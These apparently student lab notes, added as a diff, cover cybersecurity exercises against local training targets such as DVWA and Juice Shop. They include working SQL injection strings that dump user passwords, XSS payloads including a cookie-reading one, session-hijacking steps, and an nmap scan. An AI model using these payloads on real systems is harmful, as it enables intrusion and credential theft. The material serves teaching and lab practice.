@@ -1,0 +1,185 @@
+Automated Firewall Configuration (Using Python Script): 
+
+import requests
+import csv
+import subprocess
+response = requests.get(
+    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+).text
+rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["PowerShell", "-Command", rule])
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines())
+)
+for row in mycsv:
+    ip = row[1]
+
+    if ip != "dst_ip":
+        print("Added Rule to block:", ip)
+
+        rule = (
+            "netsh advfirewall firewall add rule "
+            "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+        )
+
+        subprocess.run(["PowerShell", "-Command", rule])
+
+------------------------------------------------------------------------------------------------------
+
+Password Strength Testing using Python 
+import re
+def check_password_strength(password):
+    if len(password) < 8:
+        return "Weak: Password must be at least 8 characters long."
+    if not any(char.isdigit() for char in password):
+        return "Weak: Password must include at least one number."
+    if not any(char.isupper() for char in password):
+        return "Weak: Password must include at least one uppercase letter."
+    if not any(char.islower() for char in password):
+        return "Weak: Password must include at least one lowercase letter."
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return "Medium: Add special characters to make your password stronger."
+    return "Strong: Your password is secure!"
+
+def password_checker():
+    print("Welcome to the Password Strength Checker!")
+    while True:
+        password = input("\nEnter your password (or type 'exit' to quit): ")
+        if password.lower() == "exit":
+            print("Thank you for using the Password Strength Checker! Goodbye!")
+            break
+        result = check_password_strength(password)
+        print(result)
+if __name__ == "__main__":
+    password_checker()
+
+-------------------------------------------------------------------------------------------------------------
+Packet Sniffing and Network Traffic Analysis :
+Kali Terminal : python3 -m http.server 8080
+New terminal : sudo tcpdump -i any -w capture.pcap port 8080 
+http://localhost:8080 -> refresh
+capture.pcap
+http.request.method == "POST"
+---------------------------------------------------------------------------------------------------
+SQL Injection Attack:
+sudo apt update
+sudo apt install dvwa –y 
+sudo service apache2 start 
+sudo service mysql start
+sudo nano /etc/dvwa/config.inc.php 
+Ensure: $_DVWA['db_password'] = '';
+http://127.0.0.1/dvwa  
+Click Create / Reset Database 
+DVWA Security--> Security Level = Low
+DVWA → Vulnerabilities → SQL Injection 
+1
+1' OR '1'='1
+1' ORDER BY 1-- - 
+1' ORDER BY 2-- - 
+1' ORDER BY 3-- - Stop when error occurs    Last successful number = total columns 
+1' UNION SELECT 1,2-- -
+1' UNION SELECT database(),2-- - 
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- - 
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+1' UNION SELECT user,password FROM users-- -
+------------------------------------------------------------------------------------------------
+Finding & Exploiting XSS Vulnerabilities using DVWA :
+sudo service apache2 start 
+sudo service mysql start  
+http://localhost/dvwa
+DVWA Security → set level to Low → Submit.
+DVWA → XSS (Reflected)
+<script>alert('XSS')</script>
+DVWA → XSS (Stored) 
+Fill the form: 
+Name: <h1>Hacked</h1> 
+Message: <script>alert('Stored XSS')</script> 
+Click Sign Guestbook.
+Refresh page → popup appears every time → Stored XSS successful.
+
+DVWA → XSS (DOM)  
+In the URL bar add: #<script>alert('DOM XSS')</script>
+ Enter → popup appears. english
+
+<script>alert(document.cookie)</script>
+
+Go to DVWA Security → set: 
+ Medium 
+ High 
+---------------------------------------------------------------------------------
+Testing Authentication Weaknesses and Session ManagementDVWA :
+
+sudo service apache2 start 
+sudo service mysql start 
+http://127.0.0.1/dvwa 
+DVWA → Vulnerabilities → Brute Force 
+Experiment 3: Session ID Analysis 
+Login to DVWA -> Open browser developer tools: Right Click → Inspect → Storage → Cookies 
+PHPSESSID
+Experiment 4: Session Hijacking
+login->Stay logged in (do NOT logout) 
+security level = LOW
+Right click → Inspect -> Click Storage tab -> Click Cookies -> copy
+Ctrl + Shift + P (dont login here)
+go to: http://127.0.0.1/dvwa -> Right click → Inspect -> Go to Storage → Cookies -> Click: http://127.0.0.1 
+Find PHPSESSID -> paste -> Press Enter 
+Refresh the page (F5) -> You are logged in as admin without username or password! 
+
+Session Fixation-> before login and after id is same(when it is low)
+login-> copy->logout-> other browser-> paste -> login 
+--------------------------------------------------------------------------------------
+NETWORK FORENSICS USING WIRESHARK:
+ip.addr == 192.168.0.161 
+Ip.src== 192.168.0.161
+nmap –sS <target_IP>
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+Statistics->Capture File Properties 
+Statistics->Resolved Address
+Statistics-> Protocol Hierarchy Statistics
+Statistics->Conversations 
+Statistics-> Packet Length
+Statistics-> End Points
+Statistics-> I/O Graphs
+---------------------------------------------------------------------------------------------------
+Web Application Vulnerability Scanning with OWASP ZAP:
+docker run -d -p 3000:3000 bkimminich/juice-shop 
+cd juice-shop->npm install ->npm start 
+http://localhost:3000 
+Open OWASP ZAP->Click on automated scan
+In browser proxy settings configure: 
+HTTP Proxy : 127.0.0.1 
+Port : 8080
+
+Right-click: 
+http://localhost:3000 
+Select: 
+Attack → Spider
+Attack → Active Scan
+Alerts
+1. Go to Report 
+2. Choose format: HTML PDF XML 
+3. Select: Risk levels Confidence level 
+4. Generate report
+----------------------------------------------------------------------
+
+Analyzing Phishing Emails :
+download email
+go to eml analyzer
+Key Observations: 
+• Subject: Warning: Final Notice  
+• From: malware-traffic-analysis.net Support sues@nnwifi.com 
+• To: brad@malware-traffic-analysis.net 
+• Content Type: text/html 
+• Message-ID: Missing 
+Header Analysis: 
+• Sender IP: 94.100.31.27 
+• Reverse DNS: 94-100-31-27.static.hvvc.us 
+• Mail Server: mail.nnwifi.com 
+Authentication: 
+• SPF: Failed 
+• DKIM: Not signed 
+• DMARC: Not aligned 
+
+copy the ip and open virustotal analysis
+paste and search
+---------------------------------------------------------------
